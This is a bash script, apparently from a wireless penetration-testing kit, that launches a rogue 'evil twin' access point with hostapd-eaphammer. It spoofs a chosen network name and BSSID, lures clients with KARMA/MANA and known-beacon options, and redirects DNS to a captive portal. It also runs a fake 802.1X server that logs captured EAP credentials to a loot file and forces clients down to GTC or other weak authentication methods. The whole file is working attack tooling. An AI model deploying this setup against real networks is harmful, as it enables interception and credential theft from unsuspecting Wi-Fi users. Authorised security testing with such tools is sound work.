#!/bin/bash

###############################
##      ARGS
###############################
usage() { echo "Usage: $0 -i <ap_interface> -u <upstream_interface> -e <essid> -c <channel> -b <bssid> [-p <psk>] [-x] [-d] [-w] [-t] [-m] [-k] [-q </path/to/file.txt>] [-z </path/to/file.txt>] [-r </path/to/file.txt>] [-y </path/to/file.txt>] [-n] [-s] [-d] [-j <config folder : 1|2>]" 1>&2; exit 1; }

while getopts "i:u:e:c:b:p:xd:wtmkq:z:r:y:ns:oj:" option; do
	case "${option}" in
	e)
		essid=${OPTARG};;
	c)
		channel=${OPTARG};;
	b)
		bssid=${OPTARG};;
	i)
		phy=${OPTARG};;
	u)
		upstream=${OPTARG};;
	p)
		psk=${OPTARG};;
        x)
		eap="1";;
        d)
		downgrade=${OPTARG};;
	w)
		captive="1";;
	t)
		ht="1";;
	m)
		mana="1";;
	k)
		known_beacon="1";;
	q)
		bssidWhite=${OPTARG};;
	z)
		bssidBlack=${OPTARG};;
	r)
		essidWhite=${OPTARG};;
	y)
		essidBlack=${OPTARG};;
	n)
		instance="2";;
        s)
                ssl_www_domain=${OPTARG};;
	o)
		clean="1";;
	j)
		create_cert=${OPTARG};;
	*)
		usage
	esac
done



###############################
##      EXITING FUNCTION
###############################
function ctrl_c() {
	echo -e "\e[1;33m [*] \e[0m Exiting..."
	service dnsmasq stop
	kill $hostapd_pid >/dev/null 2>&1
	echo "" > /var/lib/misc/dnsmasq.leases

	# If first instance
	if [ -z "${instance}" ] ; then
		iptables -D FORWARD -i $phy -o $upstream --jump ACCEPT
		iptables -t nat -F
		if [ ! -z "${captive}" ]; then
			service nginx stop
			sed -i "s|$DIR_WWW|{{root_folder}}|g" $NGINX_CONF_FILE
				if [ ! -z "${ssl_www_domain}" ] ; then
					sed -i "s|$DIR_WWW_SSL/$ssl_www_domain/fullchain.pem|{{ssl_certificate}}|g" $NGINX_CONF_FILE
					sed -i "s|$DIR_WWW_SSL/$ssl_www_domain/privkey.pem|{{ssl_certificate_key}}|g" $NGINX_CONF_FILE
					sed -i "s|$DIR_WWW_SSL/$ssl_www_domain/ssl-dhparams.pem|{{ssl_dhparam}}|g" $NGINX_CONF_FILE
					sed -i "s|$ssl_www_domain|{{ssl_domain}}|g" $NGINX_CONF_FILE
				fi
			mv /etc/nginx/backup.nginx.conf /etc/nginx/nginx.conf
		fi
	# If second instance
	else
		iptables -D FORWARD -i $phy -o $FIRST_INTERFACE --jump ACCEPT
	fi

	ifconfig $phy down
	ifconfig $phy hw ether $(ethtool -P $phy | awk '{print $3}')
	ip addr flush dev $phy
	ifconfig $phy up

	exit 0
}


###############################
##      CLEANING FUNCTION
###############################
function clean(){
	rm $DNSMASQ_FILE $EAP_LOOT_FILE $DIR_CONFIG/1/hostapd.conf $DIR_CONFIG/2/hostapd.conf $DIR_CONFIG/1/eap/certs/* $DIR_CONFIG/2/eap/certs/*

	echo "" > $DIR_CONFIG/1/eap/hostapd-wpe.eap_user
	echo "" > $DIR_CONFIG/2/eap/hostapd-wpe.eap_user

	echo "" > $DIR_CONFIG/1/eap/known_creds.txt
	echo "" > $DIR_CONFIG/2/eap/known_creds.txt

	echo "" > $DIR_CONFIG/1/known_ssid.txt
	echo "" > $DIR_CONFIG/2/known_ssid.txt

	echo "" > $CAPTIVE_SITE_FILE
	exit 0
}


###############################
## CREATE CERTIFICATE FUNCTION
###############################
function create_certificate(){
	DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
	DIR_EAP_CERT="$(dirname "$DIR")"/config/$1/eap/certs

	rm $DIR_EAP_CERT/server.key $DIR_EAP_CERT/csr.csr $DIR_EAP_CERT/server.pem $DIR_EAP_CERT/ca.pem $DIR_EAP_CERT/server.crt $DIR_EAP_CERT/privkey.pem >/dev/null 2>&1

	if [ ! -f $DIR_EAP_CERT/dhparam.pem ]; then
		openssl dhparam 2048 > $DIR_EAP_CERT/dhparam.pem
	fi

	openssl genrsa -out $DIR_EAP_CERT/server.key 2048
	openssl req -new -sha256 -key $DIR_EAP_CERT/server.key -out $DIR_EAP_CERT/csr.csr
	openssl req -x509 -sha256 -days 365 -key $DIR_EAP_CERT/server.key -in $DIR_EAP_CERT/csr.csr -out $DIR_EAP_CERT/server.crt
	cat $DIR_EAP_CERT/server.key > $DIR_EAP_CERT/server.pem
	cat $DIR_EAP_CERT/server.crt >> $DIR_EAP_CERT/server.pem
	cp $DIR_EAP_CERT/server.pem $DIR_EAP_CERT/ca.pem
	cp $DIR_EAP_CERT/server.pem $DIR_EAP_CERT/privkey.pem

	exit 0
}


###############################
## CONF DIR/FILES & INSTANCES
###############################

# DIRECTORIES
DIR_SCRIPT="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
DIR_ROOT="$(dirname "$DIR_SCRIPT")"
if [ ! -z "${instance}" ] ; then
	DIR_CONFIG_INSTANCE=$DIR_ROOT/config/2
	FIRST_INTERFACE=$(ip -o a | grep 10.0.0.1 | awk '{print $2}')
else
	DIR_CONFIG_INSTANCE=$DIR_ROOT/config/1
fi
DIR_CONFIG=$DIR_ROOT/config
DIR_CAPTIVE=$DIR_CONFIG/captive_portal
DIR_NGINX=$DIR_CAPTIVE/nginx
DIR_WWW=$DIR_NGINX/www
DIR_WWW_SSL=$DIR_NGINX/ssl
DIR_CONFIG_EAP=$DIR_CONFIG_INSTANCE/eap
DIR_EAP_CERTS=$DIR_CONFIG_EAP/certs

# FILES
EAP_USER_FILE=$DIR_CONFIG_EAP/hostapd-wpe.eap_user
HOSTAPD_EAPHAMMER=$DIR_SCRIPT/hostapd-eaphammer
DNSMASQ_FILE=$DIR_CONFIG/dnsmasq.conf
HOSTAPD_CONFIG_FILE=$DIR_CONFIG_INSTANCE/hostapd.conf
KNOWN_SSID_FILE=$DIR_CONFIG_INSTANCE/known_ssid.txt
CAPTIVE_SITE_FILE=$DIR_CONFIG/captive_sites.txt
NGINX_TEMPLATE_FILE=$DIR_NGINX/service_nginx.conf
EAP_LOOT_FILE=$DIR_CONFIG/loot_eap.txt
if [ ! -z "${ssl_www_domain}" ] ; then
	if [ -d $DIR_WWW_SSL/$ssl_www_domain ] ; then
		NGINX_CONF_FILE=$DIR_NGINX/nginx_ssl.conf
	else
		echo "The folder $DIR_WWW_SSL/$ssl_www_domain does not exist."
		exit 0
	fi
else
	NGINX_CONF_FILE=$DIR_NGINX/nginx.conf
fi


###############################
##      CHOOSE FUNCTION
###############################
if [ ! -z "${clean}" ] ; then
	clean
fi

if [ ! -z "${create_cert}" ] ; then
	create_certificate $create_cert
fi


###############################
####
##          MAIN
####
###############################

###############################
##      NETWORK CONF
###############################
echo -e "\e[1;33m [*] \e[0m Managing interfaces and network..."
ifconfig $phy down
ifconfig $phy hw ether $(ethtool -P $phy | awk '{print $3}')
ip addr flush dev $phy
nmcli dev set $phy managed no
ifconfig $phy up
rfkill unblock wlan

# GW and DHCP configuration
## If first instance
if [ -z "${instance}" ] ; then
	ifconfig $phy 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
	echo "conf-file=$DNSMASQ_FILE" > /etc/dnsmasq.conf

	echo "interface=$phy" > $DNSMASQ_FILE
	echo "dhcp-range=$phy,10.0.0.50,10.0.0.254,12h" >> $DNSMASQ_FILE
	echo "dhcp-option=$phy,3,10.0.0.1" >> $DNSMASQ_FILE
	echo "dhcp-authoritative" >> $DNSMASQ_FILE
	echo "log-queries" >> $DNSMASQ_FILE
	echo "log-dhcp" >> $DNSMASQ_FILE
else
	ifconfig $phy 10.0.1.1 netmask 255.255.255.0
	route add -net 10.0.1.0 netmask 255.255.255.0 gw 10.0.1.1
	echo "interface=$phy" >> $DNSMASQ_FILE
	echo "dhcp-range=$phy,10.0.1.50,10.0.1.254,12h" >> $DNSMASQ_FILE
	echo "dhcp-option=$phy,3,10.0.0.1" >> $DNSMASQ_FILE
fi

# Captive portal option and first instance
# The captive portal option must be set to the first instance
if [ ! -z "${captive}" ] && [ -z "${instance}" ]; then
	while read domain; do
		echo "address=/$domain/10.0.0.1" >> $DNSMASQ_FILE
	done <$CAPTIVE_SITE_FILE
	echo "dhcp-option=6,10.0.0.1" >> $DNSMASQ_FILE
	echo "server=8.8.8.8" >> $DNSMASQ_FILE
elif [ -z "${captive}" ] && [ -z "${instance}" ]; then
	echo "dhcp-option=6,8.8.8.8" >> $DNSMASQ_FILE
fi

service dnsmasq restart
# If first instance
if [ -z "${instance}" ] ; then

	#IPtables and forwarding
	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables --policy INPUT ACCEPT
	iptables --policy FORWARD ACCEPT
	iptables --policy OUTPUT ACCEPT
	iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE
	iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT
else
	iptables --table nat --append POSTROUTING -o $FIRST_INTERFACE --jump MASQUERADE
	iptables --append FORWARD -i $phy -o $FIRST_INTERFACE --jump ACCEPT
fi

###############################
##      WEB CONF
###############################
if [ ! -z "${captive}" ] ; then
	cp /etc/nginx/nginx.conf /etc/nginx/backup.nginx.conf
	cp $NGINX_TEMPLATE_FILE /etc/nginx/nginx.conf
	sed -i "s|{{config_file}}|$NGINX_CONF_FILE|g" /etc/nginx/nginx.conf
	sed -i "s|{{root_folder}}|$DIR_WWW|g" $NGINX_CONF_FILE
	sed -i "s|{{ssl_domain}}|$ssl_www_domain|g" $NGINX_CONF_FILE
	sed -i "s|{{ssl_certificate}}|$DIR_WWW_SSL/$ssl_www_domain/fullchain.pem|g" $NGINX_CONF_FILE
	sed -i "s|{{ssl_certificate_key}}|$DIR_WWW_SSL/$ssl_www_domain/privkey.pem|g" $NGINX_CONF_FILE
	sed -i "s|{{ssl_dhparam}}|$DIR_WWW_SSL/$ssl_www_domain/ssl-dhparams.pem|g" $NGINX_CONF_FILE
	service nginx restart
fi

###############################
##      HOSTAPD CONF
###############################
echo "interface=$phy" > $HOSTAPD_CONFIG_FILE
echo "ssid=$essid" >> $HOSTAPD_CONFIG_FILE
echo "bssid=$bssid" >> $HOSTAPD_CONFIG_FILE
echo "channel=$channel" >> $HOSTAPD_CONFIG_FILE
echo "ieee80211n=1" >> $HOSTAPD_CONFIG_FILE
echo "ieee80211ac=1" >> $HOSTAPD_CONFIG_FILE
echo "ieee80211d=1" >> $HOSTAPD_CONFIG_FILE
echo "ieee80211h=1" >> $HOSTAPD_CONFIG_FILE
echo "wmm_enabled=1" >> $HOSTAPD_CONFIG_FILE
echo "require_ht=0" >> $HOSTAPD_CONFIG_FILE

# EAPHammer specifications
if [ ! -z "${mana}" ] ; then
	echo "use_karma=1" >> $HOSTAPD_CONFIG_FILE
	echo "loud_karma=1" >> $HOSTAPD_CONFIG_FILE
fi

if [ ! -z "${known_beacon}" ] ; then
	echo "known_beacons=1" >> $HOSTAPD_CONFIG_FILE
	echo "known_ssids_file=$KNOWN_SSID_FILE" >> $HOSTAPD_CONFIG_FILE
fi

if [ ! -z "${bssidWhite}" ] ; then
	echo "macaddr_acl=1" >> $HOSTAPD_CONFIG_FILE
	echo "accept_mac_file=$bssidWhite" >> $HOSTAPD_CONFIG_FILE
	echo $bssidWhite
fi

if [ ! -z "${bssidBlack}" ] ; then
	echo "macaddr_acl=0" >> $HOSTAPD_CONFIG_FILE
	echo "deny_mac_file=$bssidBlack" >> $HOSTAPD_CONFIG_FILE
fi

if [ ! -z "${essidWite}" ] ; then
	echo "ssid_acl_mode=0" >> $HOSTAPD_CONFIG_FILE
	echo "ssid_acl_file=$essidWhite" >> $HOSTAPD_CONFIG_FILE
fi

if [ ! -z "${essidBlack}" ] ; then
	echo "ssid_acl_mode=1" >> $HOSTAPD_CONFIG_FILE
	echo "ssid_acl_file=$essidBlack" >> $HOSTAPD_CONFIG_FILE
fi

# AP configuration based on specified channel
if [ $channel -gt 13 ] ; then
	echo "hw_mode=a" >> $HOSTAPD_CONFIG_FILE
	if [ ! -z "${ht}" ] ; then
		if [ $channel -eq 36 ] || [ $channel -eq 44 ] || [ $channel -eq 52 ] || [ $channel -eq 60 ] || [ $channel -eq 100 ] || [ $channel -eq 108 ] || [ $channel -eq 116 ] || [ $channel -eq 124 ] || [ $channel -eq 132 ] || [ $channel -eq 149 ] || [ $channel -eq 157 ] ; then
			echo "ht_capab=[HT40+][LDPC][SHORT-GI-20][SHORT-GI-40][RX-STBC1][DSSS_CCK-40][MAX-AMSDU-7935]" >> $HOSTAPD_CONFIG_FILE
		else
			echo "ht_capab=[HT40-][LDPC][SHORT-GI-20][SHORT-GI-40][RX-STBC1][DSSS_CCK-40][MAX-AMSDU-7935]" >> $HOSTAPD_CONFIG_FILE
		fi
	fi
	if [ $channel -gt 99 ] && [ $channel -lt 149 ] ; then
		echo "country_code=ZA" >> $HOSTAPD_CONFIG_FILE
	elif [ $channel -gt 149 ] ; then
		echo "country_code=US" >> $HOSTAPD_CONFIG_FILE
	else
		echo "country_code=LU" >> $HOSTAPD_CONFIG_FILE
	fi
else
	echo "hw_mode=g" >> $HOSTAPD_CONFIG_FILE
	echo "country_code=LU" >> $HOSTAPD_CONFIG_FILE
fi

# If WPA PSK AP
if [ ! -z "${psk}" ] ; then
	echo "auth_algs=1" >> $HOSTAPD_CONFIG_FILE
	echo "wpa=2" >> $HOSTAPD_CONFIG_FILE
	echo "wpa_key_mgmt=WPA-PSK" >> $HOSTAPD_CONFIG_FILE
	echo "rsn_pairwise=TKIP CCMP" >> $HOSTAPD_CONFIG_FILE
	echo "wpa_passphrase=$psk" >> $HOSTAPD_CONFIG_FILE
fi

# If 802.1x
if [ ! -z "${eap}" ] ; then
	# MANA Specifications
	echo "eaphammer_logfile=$EAP_LOOT_FILE" >> $HOSTAPD_CONFIG_FILE
	# 802.1x configuration
	echo "eap_user_file=$EAP_USER_FILE" >> $HOSTAPD_CONFIG_FILE
	echo "ca_cert=$DIR_EAP_CERTS/ca.pem" >> $HOSTAPD_CONFIG_FILE
	echo "server_cert=$DIR_EAP_CERTS/server.pem" >> $HOSTAPD_CONFIG_FILE
	echo "private_key=$DIR_EAP_CERTS/privkey.pem" >> $HOSTAPD_CONFIG_FILE
	#echo "private_key_passwd=..." >> $HOSTAPD_CONFIG_FILE
	echo "dh_file=$DIR_EAP_CERTS/dhparam.pem" >> $HOSTAPD_CONFIG_FILE
	echo "eap_server=1" >> $HOSTAPD_CONFIG_FILE
	echo "eap_fast_a_id=101112131415161718191a1b1c1d1e1f" >> $HOSTAPD_CONFIG_FILE
	echo "eap_fast_a_id_info=hostapd-wpe" >> $HOSTAPD_CONFIG_FILE
	echo "eap_fast_prov=3" >> $HOSTAPD_CONFIG_FILE
	echo "ieee8021x=1" >> $HOSTAPD_CONFIG_FILE
	echo "pac_key_lifetime=604800" >> $HOSTAPD_CONFIG_FILE
	echo "pac_key_refresh_time=86400" >> $HOSTAPD_CONFIG_FILE
	echo "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f" >> $HOSTAPD_CONFIG_FILE
	echo "wpa=1" >> $HOSTAPD_CONFIG_FILE
	echo "wpa_key_mgmt=WPA-EAP" >> $HOSTAPD_CONFIG_FILE
	echo "wpa_pairwise=TKIP CCMP" >> $HOSTAPD_CONFIG_FILE

	echo "#Phase 1:" > $EAP_USER_FILE
	# GTC downgrade attack
	if [ ! -z "${downgrade}" ] ; then
		if [ $downgrade == "full" ] ; then
			echo "* PEAP [ver=1]" >> $EAP_USER_FILE
			echo "\"t\" GTC \"t\" [2]" >> $EAP_USER_FILE
		fi
		if [ $downgrade == "weakest" ] ; then
			echo "* PEAP,TTLS,TLS,FAST" >> $EAP_USER_FILE
			echo "\"t\" GTC,TTLS-PAP,MD5,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,TTLS-MSCHAPV2,TTLS \"t\" [2]" >> $EAP_USER_FILE
		fi
		if [ $downgrade == "balanced" ] ; then
			echo "* PEAP,TTLS,TLS,FAST" >> $EAP_USER_FILE
			echo "\"t\" GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5 \"t\" [2]" >> $EAP_USER_FILE
		fi
	else
		echo "* PEAP,TTLS,TLS,FAST" >> $EAP_USER_FILE
		echo "\"t\" MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5 \"t\" [2]" >> $EAP_USER_FILE
	fi

	# Accept known users
	echo "#Phase 2:" >> $EAP_USER_FILE
	awk -F'\t' '{ print "\""$1"\"  MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,GTC,TTLS-PAP,TTLS-MSCHAP,MD5     " "\""$2"\"    [2]" }' $DIR_CONFIG_EAP/known_creds.txt >> $EAP_USER_FILE
fi


###############################
##      STARTING AP
###############################
echo -e "\e[1;33m [*] \e[0m Starting Access Point..."
$HOSTAPD_EAPHAMMER $HOSTAPD_CONFIG_FILE &
hostapd_pid=$!

sleep 5

#Waiting for exit command
trap ctrl_c INT
echo -e "\e[1;31m Press enter to quit... \e[0m"
read -p ""
#Exiting
ctrl_c
